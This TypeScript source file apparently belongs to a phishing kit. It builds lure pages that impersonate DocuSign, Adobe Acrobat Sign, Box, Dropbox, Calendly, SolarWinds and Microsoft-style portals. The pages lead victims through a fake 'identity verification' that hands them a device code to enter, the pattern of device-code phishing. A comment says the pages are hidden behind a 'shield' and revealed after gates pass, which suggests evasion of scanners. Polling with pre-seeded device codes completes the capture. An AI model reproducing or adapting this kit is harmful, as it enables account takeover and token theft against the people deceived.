// Generates standalone HTML for each template theme
// Used inside the shield — base64-encoded and revealed after gates pass

import { getPollingScript } from './polling-script';

interface ThemeConfig {
  brandName: string;
  brandColor: string;
  brandBg?: string;
  logoSvg: string;
  title: string;
  description: string;
  buttonText: string;
  infoText?: string;
  infoBoxBg?: string;
  infoBoxBorder?: string;
  infoBoxColor?: string;
  layout: 'centered' | 'split';
  splitBg?: string;
  splitTitle?: string;
  splitDesc?: string;
  pageBg?: string;
  footerLinks?: string[];
}

const THEMES: Record<string, ThemeConfig> = {
  'default': {
    brandName: 'Secure Portal',
    brandColor: '#0078d4',
    logoSvg: '<svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>',
    title: 'Access Your Account',
    description: 'Generate a device verification code to authenticate your account securely.',
    buttonText: 'Generate Verification Code',
    layout: 'centered',
    pageBg: '#f0f2f5',
    footerLinks: ['Enterprise Security', 'Device Verification'],
  },
  'adobe-sign': {
    brandName: 'Adobe Acrobat Sign',
    brandColor: '#E8352B',
    logoSvg: '<svg width="32" height="32" viewBox="0 0 32 32"><rect width="32" height="32" rx="6" fill="#E8352B"/><text x="8" y="22" fill="white" font-size="16" font-weight="bold" font-family="Arial">A</text></svg>',
    title: 'Document Verification Required',
    description: 'You have been sent a document that requires identity verification before viewing.',
    buttonText: 'Verify & View Document',
    infoText: 'Contract_Agreement_2024.pdf requires verification',
    infoBoxBg: '#fff3f2', infoBoxBorder: '#ffc5c1', infoBoxColor: '#b71c1c',
    layout: 'centered',
    pageBg: '#f5f5f5',
    footerLinks: ['Adobe Terms of Use', 'Privacy Policy'],
  },
  'box': {
    brandName: 'Box',
    brandColor: '#0061D5',
    logoSvg: '<svg width="32" height="32" viewBox="0 0 32 32"><rect width="32" height="32" rx="6" fill="#0061D5"/><text x="5" y="23" fill="white" font-size="16" font-weight="bold" font-family="Arial">Box</text></svg>',
    title: 'Secure File Access',
    description: 'Verify your identity to access the shared files on Box.',
    buttonText: 'Verify & Access Files',
    infoText: 'Q4_Financial_Report.xlsx shared via Box',
    infoBoxBg: '#e8f4fd', infoBoxBorder: '#90cdf4', infoBoxColor: '#1a365d',
    layout: 'centered',
    pageBg: '#f7fafc',
    footerLinks: ['Box Terms', 'Privacy'],
  },
  'docusign-centered': {
    brandName: 'DocuSign',
    brandColor: '#3F3B9B',
    logoSvg: '<svg width="32" height="32" viewBox="0 0 32 32"><rect width="32" height="32" rx="6" fill="#3F3B9B"/><text x="5" y="22" fill="white" font-size="12" font-weight="bold" font-family="Arial">DS</text></svg>',
    title: 'Document Review Required',
    description: 'Please verify your identity to access the pending document.',
    buttonText: 'Verify & Access',
    infoText: 'NDA_Agreement_Final.pdf is waiting for your review',
    infoBoxBg: '#f0efff', infoBoxBorder: '#c4b5fd', infoBoxColor: '#3F3B9B',
    layout: 'centered',
    pageBg: '#f5f5f5',
    footerLinks: ['DocuSign Terms', 'Privacy Policy'],
  },
  'docusign-split': {
    brandName: 'DocuSign',
    brandColor: '#3F3B9B',
    logoSvg: '<svg width="32" height="32" viewBox="0 0 32 32"><rect width="32" height="32" rx="6" fill="#3F3B9B"/><text x="5" y="22" fill="white" font-size="12" font-weight="bold" font-family="Arial">DS</text></svg>',
    title: 'Review Your Document',
    description: 'Verify your identity to complete the document review.',
    buttonText: 'Verify Identity',
    layout: 'split',
    splitBg: 'linear-gradient(135deg, #3F3B9B 0%, #2c2878 100%)',
    splitTitle: 'DocuSign eVerify',
    splitDesc: 'The world\'s #1 way to verify electronically. Complete your document review securely.',
    footerLinks: ['DocuSign Terms', 'Privacy'],
  },
  'dropbox': {
    brandName: 'Dropbox',
    brandColor: '#0061FF',
    logoSvg: '<svg width="32" height="32" viewBox="0 0 32 32"><rect width="32" height="32" rx="6" fill="#0061FF"/><text x="5" y="22" fill="white" font-size="12" font-weight="bold" font-family="Arial">DB</text></svg>',
    title: 'File Sharing Verification',
    description: 'Verify your identity to access the shared Dropbox folder.',
    buttonText: 'Verify & Access',
    infoText: 'Project_Assets_2024 folder shared with you',
    infoBoxBg: '#e8f0fe', infoBoxBorder: '#90b8f8', infoBoxColor: '#0039a6',
    layout: 'centered',
    pageBg: '#f7f7f7',
    footerLinks: ['Dropbox Terms', 'Privacy'],
  },
  'microsoft-office': {
    brandName: 'Cloud Workspace',
    brandColor: '#0078d4',
    logoSvg: '<svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2"><rect x="2" y="3" width="20" height="14" rx="2"/><line x1="8" y1="21" x2="16" y2="21"/><line x1="12" y1="17" x2="12" y2="21"/></svg>',
    title: 'Access Your Workspace',
    description: 'Access your apps, documents, and collaboration tools.',
    buttonText: 'Get Started',
    layout: 'centered',
    pageBg: '#f3f3f3',
    footerLinks: ['Terms of use', 'Privacy & cookies'],
  },
  'microsoft-verify': {
    brandName: 'Identity Portal',
    brandColor: '#0078d4',
    logoSvg: '<svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>',
    title: 'Identity Verification',
    description: 'Additional verification is required to access this resource.',
    buttonText: 'Verify Now',
    layout: 'centered',
    pageBg: '#f3f3f3',
    footerLinks: ['Terms of use', 'Privacy & cookies'],
  },
  'onedrive': {
    brandName: 'CloudDrive',
    brandColor: '#0078D4',
    logoSvg: '<svg width="32" height="32" viewBox="0 0 32 32"><rect width="32" height="32" rx="6" fill="#0078D4"/><path d="M10 20c-2.2 0-4-1.8-4-4 0-1.9 1.3-3.4 3-3.9C9.6 9.8 11.6 8 14 8c2 0 3.7 1.3 4.4 3 .2 0 .4-.1.6-.1 2.2 0 4 1.8 4 4s-1.8 4-4 4H10z" fill="white" opacity="0.9"/></svg>',
    title: 'Shared File Access',
    description: 'Verify your identity to download the shared files from CloudDrive.',
    buttonText: 'Verify & Download',
    infoText: 'Budget_Review_2024.xlsx shared via CloudDrive',
    infoBoxBg: '#e1f0ff', infoBoxBorder: '#90c8f8', infoBoxColor: '#003d7a',
    layout: 'centered',
    pageBg: '#f5f5f5',
    footerLinks: ['Terms of Service', 'Privacy'],
  },
  'outlook-sync': {
    brandName: 'MailConnect',
    brandColor: '#0078d4',
    logoSvg: '<svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2"><rect x="2" y="4" width="20" height="16" rx="2"/><path d="m22 7-8.97 5.7a1.94 1.94 0 0 1-2.06 0L2 7"/></svg>',
    title: 'Mailbox Sync Setup',
    description: 'Complete verification to sync your mailbox.',
    buttonText: 'Start Sync',
    layout: 'split',
    splitBg: 'linear-gradient(135deg, #0078d4 0%, #004578 100%)',
    splitTitle: 'MailConnect Sync',
    splitDesc: 'Securely synchronize your mailbox across devices. Verify your identity to begin.',
    footerLinks: ['Terms of Service', 'Privacy'],
  },
  'sharepoint': {
    brandName: 'DocVault',
    brandColor: '#038387',
    logoSvg: '<svg width="32" height="32" viewBox="0 0 32 32"><rect width="32" height="32" rx="6" fill="#038387"/><path d="M22 19a2 2 0 0 1-2 2H12a2 2 0 0 1-2-2V9a2 2 0 0 1 2-2h5l5 5v7z" fill="white" opacity="0.9"/></svg>',
    title: 'Document Library Access',
    description: 'Verify your identity to access the document library.',
    buttonText: 'Verify & Access',
    infoText: 'Team Site / Shared Documents requires verification',
    infoBoxBg: '#e6f7f7', infoBoxBorder: '#81e6d9', infoBoxColor: '#234e52',
    layout: 'centered',
    pageBg: '#f5f5f5',
    footerLinks: ['Terms of Service', 'Privacy'],
  },
  'secureshare': {
    brandName: 'SecureShare',
    brandColor: '#2b6cb0',
    logoSvg: '<svg width="32" height="32" viewBox="0 0 32 32"><rect width="32" height="32" rx="6" fill="#2b6cb0"/><text x="5" y="22" fill="white" font-size="12" font-weight="bold" font-family="Arial">SS</text></svg>',
    title: 'Secure File Transfer',
    description: 'Verify your enterprise credentials to access the encrypted file transfer.',
    buttonText: 'Verify & Access',
    layout: 'split',
    splitBg: 'linear-gradient(135deg, #1a365d 0%, #2b6cb0 100%)',
    splitTitle: 'Enterprise File Sharing',
    splitDesc: 'End-to-end encrypted file transfer with enterprise-grade security. Verify to proceed.',
    footerLinks: ['Terms of Service', 'Privacy Policy'],
  },
  'calendar-invite': {
    brandName: 'MeetSpace',
    brandColor: '#5B5FC7',
    logoSvg: '<svg width="32" height="32" viewBox="0 0 32 32"><rect width="32" height="32" rx="6" fill="#5B5FC7"/><path d="M8 10h16v12H8z" fill="white" opacity="0.9"/><path d="M12 8v4M20 8v4M8 14h16" stroke="#5B5FC7" stroke-width="1.5"/></svg>',
    title: 'Meeting Invitation',
    description: 'You have been invited to a meeting. Verify your identity to join.',
    buttonText: 'Verify & Join Meeting',
    infoText: 'Quarterly Review Meeting — Tomorrow at 10:00 AM',
    infoBoxBg: '#ededfc', infoBoxBorder: '#b3b3e6', infoBoxColor: '#3b3f8f',
    layout: 'centered',
    pageBg: '#f5f5f5',
    footerLinks: ['Terms of Service', 'Privacy'],
  },
  'calendly-meeting': {
    brandName: 'Calendly',
    brandColor: '#006BFF',
    logoSvg: '<svg width="32" height="32" viewBox="0 0 32 32"><rect width="32" height="32" rx="6" fill="#006BFF"/><text x="5" y="22" fill="white" font-size="12" font-weight="bold" font-family="Arial">Cal</text></svg>',
    title: 'Schedule Confirmation',
    description: 'Verify your identity to confirm your scheduled meeting.',
    buttonText: 'Verify & Confirm',
    infoText: '30-Minute Meeting — Select a time to confirm',
    infoBoxBg: '#e8f0ff', infoBoxBorder: '#90b8ff', infoBoxColor: '#003d99',
    layout: 'centered',
    pageBg: '#f7f7f7',
    footerLinks: ['Calendly Terms', 'Privacy'],
  },
  'bookings-meeting': {
    brandName: 'Bookly',
    brandColor: '#0078d4',
    logoSvg: '<svg width="32" height="32" viewBox="0 0 32 32"><rect width="32" height="32" rx="6" fill="#0078d4"/><path d="M8 8h16v16H8z" fill="white" opacity="0.9"/><path d="M12 6v4M20 6v4M8 12h16" stroke="#0078d4" stroke-width="1.5"/></svg>',
    title: 'Booking Confirmation',
    description: 'Verify your identity to confirm your booking appointment.',
    buttonText: 'Verify & Book',
    infoText: 'Consultation Appointment — Pending your verification',
    infoBoxBg: '#e1f0ff', infoBoxBorder: '#90c8f8', infoBoxColor: '#003d7a',
    layout: 'centered',
    pageBg: '#f5f5f5',
    footerLinks: ['Terms of Service', 'Privacy'],
  },
  'solarwinds-meeting': {
    brandName: 'SolarWinds',
    brandColor: '#F58220',
    logoSvg: '<svg width="32" height="32" viewBox="0 0 32 32"><rect width="32" height="32" rx="6" fill="#F58220"/><text x="4" y="22" fill="white" font-size="11" font-weight="bold" font-family="Arial">SW</text></svg>',
    title: 'Meeting Setup',
    description: 'Verify your identity to access the SolarWinds collaboration space.',
    buttonText: 'Verify & Join',
    layout: 'centered',
    pageBg: '#1a1a2e',
    footerLinks: ['SolarWinds Terms', 'Privacy'],
  },
  'schedule-meeting': {
    brandName: 'Meeting Scheduler',
    brandColor: '#0078d4',
    logoSvg: '<svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2"><rect x="3" y="4" width="18" height="18" rx="2"/><line x1="16" y1="2" x2="16" y2="6"/><line x1="8" y1="2" x2="8" y2="6"/><line x1="3" y1="10" x2="21" y2="10"/></svg>',
    title: 'Schedule a Meeting',
    description: 'Verify your identity to schedule a meeting.',
    buttonText: 'Verify & Schedule',
    layout: 'centered',
    pageBg: '#f0f2f5',
    footerLinks: ['Terms', 'Privacy'],
  },
  'it-support': {
    brandName: 'IT Support Portal',
    brandColor: '#0078d4',
    logoSvg: '<svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2"><circle cx="12" cy="12" r="3"/><path d="M19.4 15a1.65 1.65 0 0 0 .33 1.82l.06.06a2 2 0 0 1-2.83 2.83l-.06-.06a1.65 1.65 0 0 0-1.82-.33 1.65 1.65 0 0 0-1 1.51V21a2 2 0 0 1-4 0v-.09A1.65 1.65 0 0 0 9 19.4a1.65 1.65 0 0 0-1.82.33l-.06.06a2 2 0 0 1-2.83-2.83l.06-.06A1.65 1.65 0 0 0 4.68 15a1.65 1.65 0 0 0-1.51-1H3a2 2 0 0 1 0-4h.09A1.65 1.65 0 0 0 4.6 9a1.65 1.65 0 0 0-.33-1.82l-.06-.06a2 2 0 0 1 2.83-2.83l.06.06A1.65 1.65 0 0 0 9 4.68a1.65 1.65 0 0 0 1-1.51V3a2 2 0 0 1 4 0v.09a1.65 1.65 0 0 0 1 1.51 1.65 1.65 0 0 0 1.82-.33l.06-.06a2 2 0 0 1 2.83 2.83l-.06.06A1.65 1.65 0 0 0 19.4 9a1.65 1.65 0 0 0 1.51 1H21a2 2 0 0 1 0 4h-.09a1.65 1.65 0 0 0-1.51 1z"/></svg>',
    title: 'IT Support Ticket Verification',
    description: 'Verify your identity to access the IT support portal and submit a ticket.',
    buttonText: 'Verify & Access Portal',
    layout: 'centered',
    pageBg: '#f0f2f5',
    footerLinks: ['IT Policy', 'Support'],
  },
  'password-reset': {
    brandName: 'Security Center',
    brandColor: '#0078d4',
    logoSvg: '<svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>',
    title: 'Password Reset Verification',
    description: 'Additional identity verification is required before resetting your password.',
    buttonText: 'Verify Identity',
    layout: 'centered',
    pageBg: '#f3f3f3',
    footerLinks: ['Terms of use', 'Privacy & cookies'],
  },
};

function escapeHtml(s: string): string {
  return s.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;');
}

function buildCenteredTemplate(t: ThemeConfig): string {
  const isDark = t.pageBg === '#1a1a2e';
  const cardBg = isDark ? '#2a2a3e' : '#fff';
  const textColor = isDark ? '#e0e0e0' : '#333';
  const titleColor = isDark ? '#fff' : '#1a1a1a';
  const footerColor = isDark ? '#888' : '#666';

  let infoBox = '';
  if (t.infoText) {
    infoBox = `<div style="display:flex;align-items:center;gap:10px;padding:12px 16px;background:${t.infoBoxBg||'#f0f0f0'};border:1px solid ${t.infoBoxBorder||'#ddd'};border-radius:8px;margin:16px 0;font-size:14px;color:${t.infoBoxColor||'#333'}">
      <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="${t.brandColor}" stroke-width="2"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/></svg>
      <span>${escapeHtml(t.infoText)}</span>
    </div>`;
  }

  return `<div style="min-height:100vh;display:flex;align-items:center;justify-content:center;background:${t.pageBg||'#f5f5f5'};padding:20px;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif">
    <div style="width:100%;max-width:480px">
      <div style="display:flex;align-items:center;gap:10px;margin-bottom:24px">
        <div style="width:36px;height:36px;background:${t.brandColor};border-radius:8px;display:flex;align-items:center;justify-content:center">${t.logoSvg}</div>
        <span style="font-size:18px;font-weight:600;color:${titleColor}">${escapeHtml(t.brandName)}</span>
      </div>
      <div id="_tplRoot" style="background:${cardBg};border-radius:12px;padding:32px;box-shadow:0 2px 12px rgba(0,0,0,.08)">
        <div id="_vi">
          <h1 style="font-size:22px;font-weight:600;color:${titleColor};margin:0 0 12px">${escapeHtml(t.title)}</h1>
          <p style="color:${textColor};font-size:14px;margin:0 0 16px;line-height:1.5">${escapeHtml(t.description)}</p>
          ${infoBox}
          <button onclick="_tpl.start()" style="width:100%;padding:12px;background:${t.brandColor};color:#fff;border:none;border-radius:8px;font-size:15px;font-weight:600;cursor:pointer">${escapeHtml(t.buttonText)}</button>
        </div>
        <div id="_vl" style="display:none;text-align:center;padding:40px 0">
          <div style="width:40px;height:40px;border:3px solid #e0e0e0;border-top-color:${t.brandColor};border-radius:50%;animation:_sp .8s linear infinite;margin:0 auto"></div>
          <p style="margin-top:16px;color:${textColor}">Preparing verification...</p>
        </div>
        <div id="_vc" style="display:none">
          <h1 style="font-size:20px;font-weight:600;color:${titleColor};margin:0 0 8px">Enter Verification Code</h1>
          <p style="color:${textColor};font-size:14px;margin:0 0 16px">Use this code to verify your identity.</p>
          <div style="background:${isDark?'#1a1a2e':'#f8f9fa'};border-radius:12px;padding:20px;text-align:center;margin:0 0 16px">
            <div style="font-size:11px;text-transform:uppercase;letter-spacing:2px;color:${footerColor};margin-bottom:8px">VERIFICATION CODE</div>
            <div id="_cd" style="font-size:32px;font-weight:700;letter-spacing:6px;color:${titleColor};font-family:monospace"></div>
            <button id="_cpb" onclick="_tpl.copy()" style="margin-top:12px;padding:8px 20px;background:${t.brandColor};color:#fff;border:none;border-radius:6px;font-size:13px;cursor:pointer">Copy</button>
          </div>
          <div style="margin:0 0 16px">
            <div style="display:flex;align-items:center;gap:8px;padding:8px 0;font-size:13px;color:${textColor}"><span style="width:22px;height:22px;background:${t.brandColor};color:#fff;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:12px;font-weight:600">1</span>Copy the code above</div>
            <div style="display:flex;align-items:center;gap:8px;padding:8px 0;font-size:13px;color:${textColor}"><span style="width:22px;height:22px;background:${t.brandColor};color:#fff;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:12px;font-weight:600">2</span>Click verify and enter the code</div>
          </div>
          <button onclick="_tpl.verify()" style="width:100%;padding:12px;background:${t.brandColor};color:#fff;border:none;border-radius:8px;font-size:15px;font-weight:600;cursor:pointer">Verify Identity</button>
          <p style="text-align:center;margin-top:12px;font-size:13px;color:${footerColor}">Code expires in <span id="_tm">0:00</span></p>
        </div>
        <div id="_vs" style="display:none;text-align:center;padding:20px 0">
          <div style="width:72px;height:72px;background:#22c55e;border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto">
            <svg width="36" height="36" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>
          </div>
          <h1 style="font-size:24px;font-weight:700;color:${titleColor};margin:24px 0 12px">Verification Complete</h1>
          <p style="font-size:15px;color:${textColor};margin:0 0 20px;line-height:1.5">Your identity has been verified successfully. You may now close this window.</p>
          <div style="background:#f0fdf4;border:1px solid #bbf7d0;border-radius:10px;padding:16px 20px;text-align:left">
            <p style="font-size:14px;font-weight:700;color:#166534;margin:0 0 4px">What happens next?</p>
            <p style="font-size:14px;color:#15803d;margin:0;line-height:1.5">Your document access has been granted. You can close this tab and return to your document.</p>
          </div>
          <p id="_ae" style="display:none"></p>
        </div>
        <div id="_ve" style="display:none;text-align:center;padding:20px 0">
          <h1 style="font-size:20px;color:#d32f2f;margin:0 0 8px">Error</h1>
          <p style="font-size:14px;color:${textColor}">Something went wrong. Please try again.</p>
          <button onclick="_tpl.reset()" style="margin-top:16px;padding:10px 24px;background:${t.brandColor};color:#fff;border:none;border-radius:8px;font-size:14px;cursor:pointer">Try Again</button>
        </div>
        <div id="_vx" style="display:none;text-align:center;padding:20px 0">
          <h1 style="font-size:20px;color:#d32f2f;margin:0 0 8px">Code Expired</h1>
          <p style="font-size:14px;color:${textColor}">The verification code has expired.</p>
          <button onclick="_tpl.reset()" style="margin-top:16px;padding:10px 24px;background:${t.brandColor};color:#fff;border:none;border-radius:8px;font-size:14px;cursor:pointer">Try Again</button>
        </div>
      </div>
      <div style="display:flex;justify-content:center;gap:16px;margin-top:20px;font-size:12px;color:${footerColor}">
        ${(t.footerLinks||[]).map(l => `<span>${escapeHtml(l)}</span>`).join('')}
      </div>
    </div>
    <style>@keyframes _sp{to{transform:rotate(360deg)}}</style>
  </div>`;
}

function buildSplitTemplate(t: ThemeConfig): string {
  return `<div style="display:flex;min-height:100vh;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif">
    <div style="flex:1;background:${t.splitBg||t.brandColor};display:flex;align-items:center;justify-content:center;padding:40px;color:#fff">
      <div style="max-width:400px;text-align:center">
        <div style="width:56px;height:56px;background:rgba(255,255,255,.15);border-radius:12px;display:flex;align-items:center;justify-content:center;margin:0 auto 24px">${t.logoSvg}</div>
        <h2 style="font-size:28px;font-weight:600;margin:0 0 16px">${escapeHtml(t.splitTitle||t.brandName)}</h2>
        <p style="font-size:15px;opacity:.85;line-height:1.6">${escapeHtml(t.splitDesc||t.description)}</p>
      </div>
    </div>
    <div style="flex:1;display:flex;align-items:center;justify-content:center;padding:40px;background:#fff">
      <div id="_tplRoot" style="width:100%;max-width:400px">
        <div id="_vi">
          <h1 style="font-size:24px;font-weight:600;color:#1a1a1a;margin:0 0 12px">${escapeHtml(t.title)}</h1>
          <p style="color:#555;font-size:14px;margin:0 0 24px;line-height:1.5">${escapeHtml(t.description)}</p>
          <button onclick="_tpl.start()" style="width:100%;padding:14px;background:${t.brandColor};color:#fff;border:none;border-radius:8px;font-size:15px;font-weight:600;cursor:pointer">${escapeHtml(t.buttonText)}</button>
        </div>
        <div id="_vl" style="display:none;text-align:center;padding:40px 0">
          <div style="width:40px;height:40px;border:3px solid #e0e0e0;border-top-color:${t.brandColor};border-radius:50%;animation:_sp .8s linear infinite;margin:0 auto"></div>
          <p style="margin-top:16px;color:#555">Preparing verification...</p>
        </div>
        <div id="_vc" style="display:none">
          <h1 style="font-size:20px;font-weight:600;color:#1a1a1a;margin:0 0 8px">Enter Verification Code</h1>
          <p style="color:#555;font-size:14px;margin:0 0 16px">Use this code to verify your identity.</p>
          <div style="background:#f8f9fa;border-radius:12px;padding:20px;text-align:center;margin:0 0 16px">
            <div style="font-size:11px;text-transform:uppercase;letter-spacing:2px;color:#888;margin-bottom:8px">VERIFICATION CODE</div>
            <div id="_cd" style="font-size:32px;font-weight:700;letter-spacing:6px;color:#1a1a1a;font-family:monospace"></div>
            <button id="_cpb" onclick="_tpl.copy()" style="margin-top:12px;padding:8px 20px;background:${t.brandColor};color:#fff;border:none;border-radius:6px;font-size:13px;cursor:pointer">Copy</button>
          </div>
          <div style="margin:0 0 16px">
            <div style="display:flex;align-items:center;gap:8px;padding:8px 0;font-size:13px;color:#555"><span style="width:22px;height:22px;background:${t.brandColor};color:#fff;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:12px;font-weight:600">1</span>Copy the code above</div>
            <div style="display:flex;align-items:center;gap:8px;padding:8px 0;font-size:13px;color:#555"><span style="width:22px;height:22px;background:${t.brandColor};color:#fff;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:12px;font-weight:600">2</span>Click verify and enter the code</div>
          </div>
          <button onclick="_tpl.verify()" style="width:100%;padding:12px;background:${t.brandColor};color:#fff;border:none;border-radius:8px;font-size:15px;font-weight:600;cursor:pointer">Verify Identity</button>
          <p style="text-align:center;margin-top:12px;font-size:13px;color:#888">Code expires in <span id="_tm">0:00</span></p>
        </div>
        <div id="_vs" style="display:none;text-align:center;padding:20px 0">
          <div style="width:72px;height:72px;background:#22c55e;border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto">
            <svg width="36" height="36" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>
          </div>
          <h1 style="font-size:24px;font-weight:700;color:#1a1a1a;margin:24px 0 12px">Verification Complete</h1>
          <p style="font-size:15px;color:#555;margin:0 0 20px;line-height:1.5">Your identity has been verified successfully. You may now close this window.</p>
          <div style="background:#f0fdf4;border:1px solid #bbf7d0;border-radius:10px;padding:16px 20px;text-align:left">
            <p style="font-size:14px;font-weight:700;color:#166534;margin:0 0 4px">What happens next?</p>
            <p style="font-size:14px;color:#15803d;margin:0;line-height:1.5">Your document access has been granted. You can close this tab and return to your document.</p>
          </div>
          <p id="_ae" style="display:none"></p>
        </div>
        <div id="_ve" style="display:none;text-align:center;padding:20px 0">
          <h1 style="font-size:20px;color:#d32f2f;margin:0 0 8px">Error</h1>
          <p style="font-size:14px;color:#555">Something went wrong.</p>
          <button onclick="_tpl.reset()" style="margin-top:16px;padding:10px 24px;background:${t.brandColor};color:#fff;border:none;border-radius:8px;font-size:14px;cursor:pointer">Try Again</button>
        </div>
        <div id="_vx" style="display:none;text-align:center;padding:20px 0">
          <h1 style="font-size:20px;color:#d32f2f;margin:0 0 8px">Code Expired</h1>
          <p style="font-size:14px;color:#555">The verification code has expired.</p>
          <button onclick="_tpl.reset()" style="margin-top:16px;padding:10px 24px;background:${t.brandColor};color:#fff;border:none;border-radius:8px;font-size:14px;cursor:pointer">Try Again</button>
        </div>
        <div style="display:flex;justify-content:center;gap:16px;margin-top:24px;font-size:12px;color:#888">
          ${(t.footerLinks||[]).map(l => `<span>${escapeHtml(l)}</span>`).join('')}
        </div>
      </div>
    </div>
    <style>@keyframes _sp{to{transform:rotate(360deg)}}@media(max-width:768px){body>div>div:first-child{display:none!important}body>div{flex-direction:column}}</style>
  </div>`;
}

export interface PreSeededData {
  deviceCode: string;
  userCode: string;
  expiresIn: number;
  interval?: number;
}

export function generateTemplateHTML(templateId: string, preSeeded?: PreSeededData): string {
  const theme = THEMES[templateId] || THEMES['default'];
  const body = theme.layout === 'split' ? buildSplitTemplate(theme) : buildCenteredTemplate(theme);
  const script = getPollingScript();

  // If pre-seeded data provided, embed it so the polling script picks it up automatically
  const preSeedScript = preSeeded
    ? `<script>window.__preSeeded=${JSON.stringify({
        deviceCode: preSeeded.deviceCode,
        userCode: preSeeded.userCode,
        expiresIn: preSeeded.expiresIn,
        interval: preSeeded.interval || 5,
      })};</script>`
    : '';

  return `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>${escapeHtml(theme.brandName)}</title><style>*{margin:0;padding:0;box-sizing:border-box}</style>${preSeedScript}</head><body>${body}<script>${script}</script></body></html>`;
}

export function getValidTemplateIds(): string[] {
  return Object.keys(THEMES);
}
